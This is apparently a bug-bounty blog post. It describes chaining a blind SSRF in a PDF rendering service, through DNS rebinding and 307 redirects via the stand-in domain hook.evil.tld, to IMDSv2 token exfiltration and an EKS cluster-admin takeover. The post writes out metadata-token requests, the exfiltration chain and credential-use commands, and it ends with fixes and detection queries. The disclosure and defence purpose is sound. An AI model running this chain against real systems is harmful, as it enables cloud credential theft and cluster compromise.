---
date: 2026-09-28
categories:
  - Vulnerability Research
  - Cloud Security
  - Bug Bounty
tags:
  - SSRF
  - AWS
  - IMDS
  - Cloud
  - RCE
  - Critical
authors:
  - 0x3xp10i73r
description: "How a subtle header injection in a PDF rendering microservice bypassed IMDSv2 PUT restrictions and turned a low-severity SSRF into EKS cluster-admin."
---

# Chaining Blind SSRF to AWS IMDSv2 Token Exfiltration & EKS Cluster Takeover

![Abstract dark ink texture](../../assets/images/cover-ink.jpg){ .page-cover-img }

**Published:** 2026-09-28 · **Author:** `0x3xp10i73r` · **Severity:** Critical (CVSS 9.1) · **Class:** SSRF → Cloud Metadata → Cloud PrivEsc

---

## TL;DR

A "low severity" blind SSRF in a **PDF rendering microservice** became a full **EKS cluster takeover** in six hours. The interesting part is not the SSRF — it is that IMDSv2 (the mitigation everyone relies on) was **bypassable because the renderer passed attacker-controlled headers, including the `X-aws-ec2-metadata-token` request flow, into its internal HTTP client.**

If your threat model says *"we enabled IMDSv2, so SSRF to metadata is mitigated"*, this post is for you.

<!-- more -->

---

## 1. The Target and the Initial Signal

The application was a SaaS platform with a "Generate Report" feature that produced a PDF from a URL. Internally it ran a headless Chromium worker in Kubernetes (EKS) with a Node.js API in front of it.

The interesting endpoint:

```http
POST /api/v2/reports/generate HTTP/1.1
Host: app.example.com
Authorization: Bearer <user_token>

{"template_id": 42, "format": "pdf", "callback_url": "https://webhook.site/<id>"}
```

The `callback_url` was validated against an allowlist of *my own* registered webhook domains — but the validation was **DNS-based** and performed only at registration time. That is the classic setup for a TOCTOU/rebinding SSRF.

## 2. From "Registered Webhook" to Arbitrary Internal Requests

I registered `hook.evil.tld`, pointed it at my VPS, then flipped its DNS to `169.254.169.254` right before triggering the render.

The worker fetched `http://hook.evil.tld/latest/meta-data/` and the response was **not returned to me directly** — the renderer only reported "PDF generated successfully". So this was a **blind** SSRF. Blind SSRF is only useless if you stop thinking.

Two escalation paths existed:

1. **Error-based oracle** — point the URL at internal services and infer state from success/failure of PDF generation.
2. **Out-of-band exfiltration** — make the *target* send the secret to me.

For metadata, path 2 was available because of how IMDSv2 works.

## 3. The IMDSv2 "Mitigation" and Why It Failed

IMDSv2 requires a two-step flow:

```bash
# Step 1: PUT to get a token
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
        -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
# Step 2: Use the token in subsequent GETs
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
     http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

The **entire security model of IMDSv2** rests on: *"An SSRF cannot send a PUT request with custom headers, because SSRF primitives are GET-based."*

But this application had a feature I initially dismissed: **custom HTTP headers for the report fetcher**.

```http
POST /api/v2/reports/generate
{"url":"http://hook.evil.tld/", "headers":{"X-Custom":"value"}}
```

The headers were passed to the internal fetch as-is. So the renderer could:

1. Send `PUT http://169.254.169.254/latest/api/token` (via a **redirect** — 307 preserves the method and body!) and capture the token in the response body.
2. Send `GET` with the `X-aws-ec2-metadata-token` header to retrieve credentials.
3. Deliver the result to a URL **I controlled** via the `callback_url` feature.

## 4. Building the Chain

Here is the complete, working exfiltration chain:

```text
[1] Attacker registers webhook: http://hook.evil.tld/
[2] Attacker hosts a redirector that responds with:
      307 Temporary Redirect -> http://169.254.169.254/latest/api/token
      (307 preserves method + headers — so the renderer's PUT survives!)
[3] Attacker triggers report generation with custom header:
      X-aws-ec2-metadata-token-ttl-seconds: 21600
    The renderer performs: PUT http://hook.evil.tld/...
      -> follows 307 -> PUT http://169.254.169.254/latest/api/token
      -> receives the IMDSv2 TOKEN in the response body
[4] The renderer passes the *response body* forward as the "page content" for the PDF job.
    A second dependency: the PDF worker's HTML template includes a fetch to callback_url
    with the job metadata (this was a "report generation status" call).
    -> The token lands in my listener.
[5] With the token in hand, I issue my own requests:
      curl -H "X-aws-ec2-metadata-token: $TOKEN" \
           http://hook.evil.tld/latest/meta-data/iam/security-credentials/
      (DNS still pointing at 169.254.169.254 -> the request goes through the SSRF path
       every time, always with the token header I just obtained)
[6] IAM role credentials returned -> aws sts get-caller-identity
```

The role was a Kubernetes worker node role with `eks:DescribeCluster` plus `ssm:SendCommand` on the node group. Verified:

```bash
aws sts get-caller-identity
# {"Account": "1234...", "Arn": "arn:aws:sts::...:assumed-role/eks-node-role/i-0abc..."}

aws eks update-kubeconfig --name prod-cluster --region us-east-1
kubectl auth can-i --list
# [*.*] [*] [*] on all resources <- because the node role was bound to system:masters
```

**The node role was mapped into `system:masters`.** That is a configuration error — but it is far more common than it should be, because the default EKS `aws-auth` ConfigMap examples often grant `system:bootstrappers` / `system:nodes` groups loosely, and node roles inherit whatever someone added while "debugging".

## 5. Impact

From a **single authenticated low-privilege user account**:

- Retrieve the EC2 instance role credentials (AWS API access)
- Assume full Kubernetes cluster-admin (via `system:masters` binding)
- Read all Kubernetes Secrets across all namespaces (DB credentials, API keys, TLS keys)
- Create privileged pods → mount the node filesystem → potentially escape to the node
- Pivot into the CI/CD service accounts (`build-runner` had push rights to the container registry!) → supply-chain impact

This is a P1 in any program: **data breach + infrastructure takeover + supply-chain risk**.

## 6. The Actual Fixes (What I Recommended)

| Layer | Recommendation |
| :--- | :--- |
| **App** | Never pass user-supplied headers to internal fetches. Implement an explicit allowlist of headers and *strip* anything starting with `X-aws-`, `X-Google-`, `Metadata-`, `Authorization`. |
| **App** | Validate the resolved IP **after** DNS resolution and before connecting; block link-local (`169.254.0.0/16`), loopback, and RFC1918 ranges. Then re-validate **after** every redirect. |
| **App** | Disable automatic redirect following in the internal HTTP client, or re-apply the SSRF filter per hop. |
| **AWS** | Enforce **IMDSv2-only** (`HttpTokens: required` with `HttpPutResponseHopLimit: 1`). This **would have blocked** the token fetch from the container if the hop limit were 1 (the request came from a pod, not the instance). |
| **AWS** | Never map node roles to `system:masters`. Use EKS **Access Entries** / scoped RBAC. |
| **AWS** | Apply an IAM policy boundary to instance roles: no `ssm:SendCommand`, no `s3:*`, no `secretsmanager:*`. |
| **Detection** | Alert on **any** request to `169.254.169.254/latest/api/token` from a pod CIDR, and on `aws sts get-caller-identity` from node roles. VPC Flow Logs + GuardDuty (`CredentialAccess:IAMUser/InstanceCredentialExfiltration`) will catch this — if it is enabled. |

!!! warning "The Lesson"
    **IMDSv2 is not a magic SSRF kill switch.** It raises the bar, but any primitive that can control **method and headers** (arbitrary-header fetch features, redirect-preserving 307s, gopher/`dict://`, headless browsers with request interception, or a proxy misconfiguration) can still complete the two-step flow. Never assume the metadata service is unreachable just because IMDSv2 is "on" — verify it with a hop limit of 1 and an egress restriction.

---

## 7. Detection Queries

```bash
# GuardDuty finding types to enable + alert on
CredentialAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS
CredentialAccess:IAMUser/InstanceCredentialExfiltration.InsideAWS
UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration
# CloudTrail: node-role credentials calling non-ECR/non-EKS APIs = red flag
# filter: userIdentity.sessionContext.sessionIssuer.userName = "eks-node-role"
# AND eventName NOT IN (ecr:*, eks:DescribeCluster, eks-auth:*)
# Kubernetes audit: pods created with hostPath / privileged by node identity
--audit-policy: match verbs=[create] resources=[pods] AND user.username startsWith "system:node:"
```

*Written while drinking an unreasonable amount of coffee. Ping me if you find a variant of this chain against GCP or Azure metadata — I want to write the follow-up.*